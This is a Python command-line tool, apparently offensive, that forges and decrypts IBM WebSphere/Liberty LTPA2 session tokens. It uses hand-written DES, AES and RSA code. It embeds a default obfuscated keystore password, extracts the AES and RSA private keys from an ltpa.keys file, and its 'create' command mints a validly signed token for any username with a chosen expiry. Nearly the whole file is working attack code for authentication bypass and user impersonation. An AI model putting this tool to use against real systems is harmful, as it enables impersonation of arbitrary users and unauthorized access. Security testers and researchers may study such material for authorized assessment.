#!/usr/bin/env python3
"""IBM WebSphere / Liberty LTPA2 token manipulation.

Pure-Python: no pyDes, no pycryptodome. Only the standard library is used
(hashlib for SHA-1 is stdlib, not a third-party crypto package).

Self-contained implementations below:
  - DES / 3DES (ECB)       -> unwrap the keystore (3DESKey, PrivateKey)
  - AES-128 (CBC)          -> encrypt/decrypt the LTPA2 token
  - RSA + EMSA-PKCS1-v1_5  -> sign/verify the token (plain modular exponentiation)
"""
import hashlib
import struct
import time
import datetime
import argparse
import base64
import binascii


# ----------------------------------------------------------------------------
# DES / Triple DES (ECB)
# ----------------------------------------------------------------------------
_IP = [58, 50, 42, 34, 26, 18, 10, 2, 60, 52, 44, 36, 28, 20, 12, 4,
       62, 54, 46, 38, 30, 22, 14, 6, 64, 56, 48, 40, 32, 24, 16, 8,
       57, 49, 41, 33, 25, 17, 9, 1, 59, 51, 43, 35, 27, 19, 11, 3,
       61, 53, 45, 37, 29, 21, 13, 5, 63, 55, 47, 39, 31, 23, 15, 7]
_FP = [40, 8, 48, 16, 56, 24, 64, 32, 39, 7, 47, 15, 55, 23, 63, 31,
       38, 6, 46, 14, 54, 22, 62, 30, 37, 5, 45, 13, 53, 21, 61, 29,
       36, 4, 44, 12, 52, 20, 60, 28, 35, 3, 43, 11, 51, 19, 59, 27,
       34, 2, 42, 10, 50, 18, 58, 26, 33, 1, 41, 9, 49, 17, 57, 25]
_E = [32, 1, 2, 3, 4, 5, 4, 5, 6, 7, 8, 9, 8, 9, 10, 11, 12, 13,
      12, 13, 14, 15, 16, 17, 16, 17, 18, 19, 20, 21, 20, 21, 22, 23, 24, 25,
      24, 25, 26, 27, 28, 29, 28, 29, 30, 31, 32, 1]
_P = [16, 7, 20, 21, 29, 12, 28, 17, 1, 15, 23, 26, 5, 18, 31, 10,
      2, 8, 24, 14, 32, 27, 3, 9, 19, 13, 30, 6, 22, 11, 4, 25]
_PC1 = [57, 49, 41, 33, 25, 17, 9, 1, 58, 50, 42, 34, 26, 18,
        10, 2, 59, 51, 43, 35, 27, 19, 11, 3, 60, 52, 44, 36,
        63, 55, 47, 39, 31, 23, 15, 7, 62, 54, 46, 38, 30, 22,
        14, 6, 61, 53, 45, 37, 29, 21, 13, 5, 28, 20, 12, 4]
_PC2 = [14, 17, 11, 24, 1, 5, 3, 28, 15, 6, 21, 10,
        23, 19, 12, 4, 26, 8, 16, 7, 27, 20, 13, 2,
        41, 52, 31, 37, 47, 55, 30, 40, 51, 45, 33, 48,
        44, 49, 39, 56, 34, 53, 46, 42, 50, 36, 29, 32]
_SHIFTS = [1, 1, 2, 2, 2, 2, 2, 2, 1, 2, 2, 2, 2, 2, 2, 1]
_SBOX = [
    [[14, 4, 13, 1, 2, 15, 11, 8, 3, 10, 6, 12, 5, 9, 0, 7],
     [0, 15, 7, 4, 14, 2, 13, 1, 10, 6, 12, 11, 9, 5, 3, 8],
     [4, 1, 14, 8, 13, 6, 2, 11, 15, 12, 9, 7, 3, 10, 5, 0],
     [15, 12, 8, 2, 4, 9, 1, 7, 5, 11, 3, 14, 10, 0, 6, 13]],
    [[15, 1, 8, 14, 6, 11, 3, 4, 9, 7, 2, 13, 12, 0, 5, 10],
     [3, 13, 4, 7, 15, 2, 8, 14, 12, 0, 1, 10, 6, 9, 11, 5],
     [0, 14, 7, 11, 10, 4, 13, 1, 5, 8, 12, 6, 9, 3, 2, 15],
     [13, 8, 10, 1, 3, 15, 4, 2, 11, 6, 7, 12, 0, 5, 14, 9]],
    [[10, 0, 9, 14, 6, 3, 15, 5, 1, 13, 12, 7, 11, 4, 2, 8],
     [13, 7, 0, 9, 3, 4, 6, 10, 2, 8, 5, 14, 12, 11, 15, 1],
     [13, 6, 4, 9, 8, 15, 3, 0, 11, 1, 2, 12, 5, 10, 14, 7],
     [1, 10, 13, 0, 6, 9, 8, 7, 4, 15, 14, 3, 11, 5, 2, 12]],
    [[7, 13, 14, 3, 0, 6, 9, 10, 1, 2, 8, 5, 11, 12, 4, 15],
     [13, 8, 11, 5, 6, 15, 0, 3, 4, 7, 2, 12, 1, 10, 14, 9],
     [10, 6, 9, 0, 12, 11, 7, 13, 15, 1, 3, 14, 5, 2, 8, 4],
     [3, 15, 0, 6, 10, 1, 13, 8, 9, 4, 5, 11, 12, 7, 2, 14]],
    [[2, 12, 4, 1, 7, 10, 11, 6, 8, 5, 3, 15, 13, 0, 14, 9],
     [14, 11, 2, 12, 4, 7, 13, 1, 5, 0, 15, 10, 3, 9, 8, 6],
     [4, 2, 1, 11, 10, 13, 7, 8, 15, 9, 12, 5, 6, 3, 0, 14],
     [11, 8, 12, 7, 1, 14, 2, 13, 6, 15, 0, 9, 10, 4, 5, 3]],
    [[12, 1, 10, 15, 9, 2, 6, 8, 0, 13, 3, 4, 14, 7, 5, 11],
     [10, 15, 4, 2, 7, 12, 9, 5, 6, 1, 13, 14, 0, 11, 3, 8],
     [9, 14, 15, 5, 2, 8, 12, 3, 7, 0, 4, 10, 1, 13, 11, 6],
     [4, 3, 2, 12, 9, 5, 15, 10, 11, 14, 1, 7, 6, 0, 8, 13]],
    [[4, 11, 2, 14, 15, 0, 8, 13, 3, 12, 9, 7, 5, 10, 6, 1],
     [13, 0, 11, 7, 4, 9, 1, 10, 14, 3, 5, 12, 2, 15, 8, 6],
     [1, 4, 11, 13, 12, 3, 7, 14, 10, 15, 6, 8, 0, 5, 9, 2],
     [6, 11, 13, 8, 1, 4, 10, 7, 9, 5, 0, 15, 14, 2, 3, 12]],
    [[13, 2, 8, 4, 6, 15, 11, 1, 10, 9, 3, 14, 5, 0, 12, 7],
     [1, 15, 13, 8, 10, 3, 7, 4, 12, 5, 6, 11, 0, 14, 9, 2],
     [7, 11, 4, 1, 9, 12, 14, 2, 0, 6, 10, 13, 15, 3, 5, 8],
     [2, 1, 14, 7, 4, 10, 8, 13, 15, 12, 9, 0, 3, 5, 6, 11]],
]


def _bytes_to_bits(data):
    bits = []
    for byte in data:
        for i in range(7, -1, -1):
            bits.append((byte >> i) & 1)
    return bits


def _bits_to_bytes(bits):
    out = bytearray()
    for i in range(0, len(bits), 8):
        byte = 0
        for b in bits[i:i + 8]:
            byte = (byte << 1) | b
        out.append(byte)
    return bytes(out)


def _permute(block, table):
    return [block[x - 1] for x in table]


def _xor_bits(a, b):
    return [i ^ j for i, j in zip(a, b)]


def _des_subkeys(key8):
    key56 = _permute(_bytes_to_bits(key8), _PC1)
    c, d = key56[:28], key56[28:]
    subkeys = []
    for shift in _SHIFTS:
        c = c[shift:] + c[:shift]
        d = d[shift:] + d[:shift]
        subkeys.append(_permute(c + d, _PC2))
    return subkeys


def _des_feistel(r, subkey):
    x = _xor_bits(_permute(r, _E), subkey)
    out = []
    for i in range(8):
        chunk = x[i * 6:i * 6 + 6]
        row = (chunk[0] << 1) | chunk[5]
        col = (chunk[1] << 3) | (chunk[2] << 2) | (chunk[3] << 1) | chunk[4]
        val = _SBOX[i][row][col]
        out.extend([(val >> 3) & 1, (val >> 2) & 1, (val >> 1) & 1, val & 1])
    return _permute(out, _P)


def _des_crypt_block(block8, subkeys):
    bits = _permute(_bytes_to_bits(block8), _IP)
    left, right = bits[:32], bits[32:]
    for sk in subkeys:
        left, right = right, _xor_bits(left, _des_feistel(right, sk))
    return _bits_to_bytes(_permute(right + left, _FP))


class TripleDES:
    """3DES EDE in ECB mode, matching pyDes.triple_des(..., ECB)."""

    def __init__(self, key24):
        self.k1 = _des_subkeys(key24[0:8])
        self.k2 = _des_subkeys(key24[8:16])
        self.k3 = _des_subkeys(key24[16:24])

    def _dec_block(self, b):
        b = _des_crypt_block(b, self.k3[::-1])   # D_K3
        b = _des_crypt_block(b, self.k2)         # E_K2
        b = _des_crypt_block(b, self.k1[::-1])   # D_K1
        return b

    def decrypt(self, data):
        # Raw ECB decrypt; callers slice the result by explicit length, so no
        # PKCS#5 unpadding is needed (and never affects the leading bytes).
        return b"".join(self._dec_block(data[i:i + 8])
                        for i in range(0, len(data), 8))


# ----------------------------------------------------------------------------
# AES-128 (CBC)
# ----------------------------------------------------------------------------
_AES_SBOX = [
    0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5, 0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76,
    0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0, 0xad, 0xd4, 0xa2, 0xaf, 0x9c, 0xa4, 0x72, 0xc0,
    0xb7, 0xfd, 0x93, 0x26, 0x36, 0x3f, 0xf7, 0xcc, 0x34, 0xa5, 0xe5, 0xf1, 0x71, 0xd8, 0x31, 0x15,
    0x04, 0xc7, 0x23, 0xc3, 0x18, 0x96, 0x05, 0x9a, 0x07, 0x12, 0x80, 0xe2, 0xeb, 0x27, 0xb2, 0x75,
    0x09, 0x83, 0x2c, 0x1a, 0x1b, 0x6e, 0x5a, 0xa0, 0x52, 0x3b, 0xd6, 0xb3, 0x29, 0xe3, 0x2f, 0x84,
    0x53, 0xd1, 0x00, 0xed, 0x20, 0xfc, 0xb1, 0x5b, 0x6a, 0xcb, 0xbe, 0x39, 0x4a, 0x4c, 0x58, 0xcf,
    0xd0, 0xef, 0xaa, 0xfb, 0x43, 0x4d, 0x33, 0x85, 0x45, 0xf9, 0x02, 0x7f, 0x50, 0x3c, 0x9f, 0xa8,
    0x51, 0xa3, 0x40, 0x8f, 0x92, 0x9d, 0x38, 0xf5, 0xbc, 0xb6, 0xda, 0x21, 0x10, 0xff, 0xf3, 0xd2,
    0xcd, 0x0c, 0x13, 0xec, 0x5f, 0x97, 0x44, 0x17, 0xc4, 0xa7, 0x7e, 0x3d, 0x64, 0x5d, 0x19, 0x73,
    0x60, 0x81, 0x4f, 0xdc, 0x22, 0x2a, 0x90, 0x88, 0x46, 0xee, 0xb8, 0x14, 0xde, 0x5e, 0x0b, 0xdb,
    0xe0, 0x32, 0x3a, 0x0a, 0x49, 0x06, 0x24, 0x5c, 0xc2, 0xd3, 0xac, 0x62, 0x91, 0x95, 0xe4, 0x79,
    0xe7, 0xc8, 0x37, 0x6d, 0x8d, 0xd5, 0x4e, 0xa9, 0x6c, 0x56, 0xf4, 0xea, 0x65, 0x7a, 0xae, 0x08,
    0xba, 0x78, 0x25, 0x2e, 0x1c, 0xa6, 0xb4, 0xc6, 0xe8, 0xdd, 0x74, 0x1f, 0x4b, 0xbd, 0x8b, 0x8a,
    0x70, 0x3e, 0xb5, 0x66, 0x48, 0x03, 0xf6, 0x0e, 0x61, 0x35, 0x57, 0xb9, 0x86, 0xc1, 0x1d, 0x9e,
    0xe1, 0xf8, 0x98, 0x11, 0x69, 0xd9, 0x8e, 0x94, 0x9b, 0x1e, 0x87, 0xe9, 0xce, 0x55, 0x28, 0xdf,
    0x8c, 0xa1, 0x89, 0x0d, 0xbf, 0xe6, 0x42, 0x68, 0x41, 0x99, 0x2d, 0x0f, 0xb0, 0x54, 0xbb, 0x16,
]
_AES_INV_SBOX = [0] * 256
for _i, _v in enumerate(_AES_SBOX):
    _AES_INV_SBOX[_v] = _i
_RCON = [0x01, 0x02, 0x04, 0x08, 0x10, 0x20, 0x40, 0x80, 0x1b, 0x36]


def _gmul(a, b):
    p = 0
    for _ in range(8):
        if b & 1:
            p ^= a
        hi = a & 0x80
        a = (a << 1) & 0xff
        if hi:
            a ^= 0x1b
        b >>= 1
    return p


def _aes_key_expansion(key):
    nk, nr = 4, 10
    w = [list(key[4 * i:4 * i + 4]) for i in range(nk)]
    for i in range(nk, 4 * (nr + 1)):
        temp = list(w[i - 1])
        if i % nk == 0:
            temp = temp[1:] + temp[:1]
            temp = [_AES_SBOX[b] for b in temp]
            temp[0] ^= _RCON[i // nk - 1]
        w.append([w[i - nk][j] ^ temp[j] for j in range(4)])
    keys = []
    for r in range(nr + 1):
        rk = []
        for c in range(4):
            rk.extend(w[r * 4 + c])
        keys.append(rk)
    return keys


def _add_round_key(s, rk):
    return [s[i] ^ rk[i] for i in range(16)]


def _shift_rows(s):
    o = [0] * 16
    for r in range(4):
        for c in range(4):
            o[4 * c + r] = s[4 * ((c + r) % 4) + r]
    return o


def _inv_shift_rows(s):
    o = [0] * 16
    for r in range(4):
        for c in range(4):
            o[4 * c + r] = s[4 * ((c - r) % 4) + r]
    return o


def _mix_columns(s):
    o = [0] * 16
    for c in range(4):
        col = s[4 * c:4 * c + 4]
        o[4 * c + 0] = _gmul(col[0], 2) ^ _gmul(col[1], 3) ^ col[2] ^ col[3]
        o[4 * c + 1] = col[0] ^ _gmul(col[1], 2) ^ _gmul(col[2], 3) ^ col[3]
        o[4 * c + 2] = col[0] ^ col[1] ^ _gmul(col[2], 2) ^ _gmul(col[3], 3)
        o[4 * c + 3] = _gmul(col[0], 3) ^ col[1] ^ col[2] ^ _gmul(col[3], 2)
    return o


def _inv_mix_columns(s):
    o = [0] * 16
    for c in range(4):
        col = s[4 * c:4 * c + 4]
        o[4 * c + 0] = _gmul(col[0], 14) ^ _gmul(col[1], 11) ^ _gmul(col[2], 13) ^ _gmul(col[3], 9)
        o[4 * c + 1] = _gmul(col[0], 9) ^ _gmul(col[1], 14) ^ _gmul(col[2], 11) ^ _gmul(col[3], 13)
        o[4 * c + 2] = _gmul(col[0], 13) ^ _gmul(col[1], 9) ^ _gmul(col[2], 14) ^ _gmul(col[3], 11)
        o[4 * c + 3] = _gmul(col[0], 11) ^ _gmul(col[1], 13) ^ _gmul(col[2], 9) ^ _gmul(col[3], 14)
    return o


def _aes_encrypt_block(block, rk):
    s = _add_round_key(list(block), rk[0])
    for rnd in range(1, 10):
        s = [_AES_SBOX[b] for b in s]
        s = _shift_rows(s)
        s = _mix_columns(s)
        s = _add_round_key(s, rk[rnd])
    s = [_AES_SBOX[b] for b in s]
    s = _shift_rows(s)
    s = _add_round_key(s, rk[10])
    return bytes(s)


def _aes_decrypt_block(block, rk):
    s = _add_round_key(list(block), rk[10])
    for rnd in range(9, 0, -1):
        s = _inv_shift_rows(s)
        s = [_AES_INV_SBOX[b] for b in s]
        s = _add_round_key(s, rk[rnd])
        s = _inv_mix_columns(s)
    s = _inv_shift_rows(s)
    s = [_AES_INV_SBOX[b] for b in s]
    s = _add_round_key(s, rk[0])
    return bytes(s)


class AES128CBC:
    def __init__(self, key):
        self.rk = _aes_key_expansion(key)

    def encrypt(self, data, iv):
        prev, out = iv, bytearray()
        for i in range(0, len(data), 16):
            block = bytes(a ^ b for a, b in zip(data[i:i + 16], prev))
            prev = _aes_encrypt_block(block, self.rk)
            out += prev
        return bytes(out)

    def decrypt(self, data, iv):
        prev, out = iv, bytearray()
        for i in range(0, len(data), 16):
            block = data[i:i + 16]
            dec = _aes_decrypt_block(block, self.rk)
            out += bytes(a ^ b for a, b in zip(dec, prev))
            prev = block
        return bytes(out)


# ----------------------------------------------------------------------------
# RSA + EMSA-PKCS1-v1_5 (SHA-1), raw modular exponentiation
# ----------------------------------------------------------------------------
_SHA1_DIGEST_INFO = bytes.fromhex("3021300906052b0e03021a05000414")


def _emsa_pkcs1_v15(sha1_digest, k):
    t = _SHA1_DIGEST_INFO + sha1_digest
    ps = b"\xff" * (k - len(t) - 3)
    return b"\x00\x01" + ps + b"\x00" + t


def _rsa_sign(n, d, message):
    """Sign SHA1(message) with EMSA-PKCS1-v1_5 (matches the original double hash)."""
    k = (n.bit_length() + 7) // 8
    em = _emsa_pkcs1_v15(hashlib.sha1(message).digest(), k)
    sig = pow(int.from_bytes(em, "big"), d, n)
    return sig.to_bytes(k, "big")


def _rsa_verify(n, e, message, sig):
    k = (n.bit_length() + 7) // 8
    em = pow(int.from_bytes(sig, "big"), e, n).to_bytes(k, "big")
    return em == _emsa_pkcs1_v15(hashlib.sha1(message).digest(), k)


# Default WebSphere LTPA keystore password ({xor} obfuscated).
LTPA_PASS = "{xor}CDo9Hgw="


class websphere_token:
    def __init__(self, keysfile="ltpa.keys"):
        r = websphere_token.parse_keysfile(keysfile)

        # Derive the 3DES key that protects the keystore from the LTPA password.
        s_key = r['com.ibm.websphere.ltpa.3DESKey']
        lt_key = websphere_token.dec_ltpa_pass(LTPA_PASS)
        o = hashlib.sha1(lt_key).digest() + b'\x00' * 4  # 20 + 4 = 24-byte 3DES key
        ci = TripleDES(o)

        # The AES key used for the LTPA2 token is wrapped with that 3DES key.
        self.aes_key = ci.decrypt(base64.b64decode(s_key))[:16]

        # RSA key material.
        pv_key = ci.decrypt(base64.b64decode(r['com.ibm.websphere.ltpa.PrivateKey']))
        pb_key = base64.b64decode(r['com.ibm.websphere.ltpa.PublicKey'])

        n = pb_key[:129]
        e = pb_key[129:]
        dlen = struct.unpack(">I", pv_key[:4])[0]
        d = pv_key[4:dlen + 4]

        self.n = int.from_bytes(n, "big")
        self.e = int.from_bytes(e, "big")
        self.d = int.from_bytes(d, "big")

    @staticmethod
    def dec_ltpa_pass(s):
        """Decode a {xor} obfuscated WebSphere password; returns bytes."""
        s = base64.b64decode(s.replace("{xor}", ""))
        return bytes(b ^ ord("_") for b in s)

    @staticmethod
    def parse_keysfile(f):
        ret = {}
        for l in open(f).readlines():
            l = l.strip()
            if not l or l[0] == "#" or l[0] == "$":
                continue
            try:
                k, v = l.split("=", 1)
                # Java .properties escapes '=' and ':' with backslashes; strip them.
                ret[k] = v.replace("\\", "")
            except ValueError as e:
                print(l, e)
        return ret

    def create_token(self, username, expiration=None):
        if expiration is None:
            now = datetime.datetime.now() + datetime.timedelta(hours=12)
            ts = int(time.mktime(now.timetuple()))
            expiration = str(ts) + "000"

        clear = 'expire:' + expiration
        clear += '$u:user\\:' + username
        clear += '%' + expiration + '%'

        inner = hashlib.sha1(clear[:clear.find('%')].encode()).digest()
        sig = _rsa_sign(self.n, self.d, inner)
        clear += base64.b64encode(sig).decode()

        token = self.encrypt_ltpa2token(clear)
        print('Token:', token)
        return token

    def encrypt_ltpa2token(self, s):
        data = s.encode() if isinstance(s, str) else s
        length = 16 - (len(data) % 16)
        data += bytes([length]) * length  # PKCS#7 padding
        cia = AES128CBC(self.aes_key)
        return base64.b64encode(cia.encrypt(data, self.aes_key)).decode()

    def decrypt_ltpa2token(self, s):
        cia = AES128CBC(self.aes_key)
        ss = cia.decrypt(base64.b64decode(s), self.aes_key)
        pad = ss[-1]
        ss = ss[:-pad]
        print("Decrypted token: %s" % ss.decode("latin-1"))

        sig = base64.b64decode(ss[ss.rfind(b"%") + 1:])
        inner = hashlib.sha1(ss[:ss.find(b'%')]).digest()
        if _rsa_verify(self.n, self.e, inner, sig):
            print("Signature is OK")
        else:
            print("Signature is BAD")

        # Raw RSA "encrypt" (sig ^ e mod n) to recover the padded signed block.
        blob_int = pow(int.from_bytes(sig, "big"), self.e, self.n)
        blob = blob_int.to_bytes((self.n.bit_length() + 7) // 8, "big")
        recovered = binascii.hexlify(blob[blob.find(b"\x00") + 1:])[-40:].decode()
        print('Signature (SHA-1):', recovered)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description='IBM WebSphere Token manipulation', add_help=True)
    subparsers = parser.add_subparsers(help='commands', dest='cmd')

    create_parser = subparsers.add_parser('create', help='Create token')
    create_parser.add_argument('username', action="store", help='Username')
    create_parser.add_argument('-e', action="store", dest="expiration",
                               help='Expiration in milliseconds since Epoch',
                               default=None)

    decrypt_parser = subparsers.add_parser('decrypt', help='Decrypt token')
    decrypt_parser.add_argument('token', action="store", help='Token to decrypt')

    results = parser.parse_args()

    t = websphere_token()

    if results.cmd == 'create':
        t.create_token(results.username, results.expiration)
    elif results.cmd == 'decrypt':
        t.decrypt_ltpa2token(results.token)
    else:
        parser.print_help()
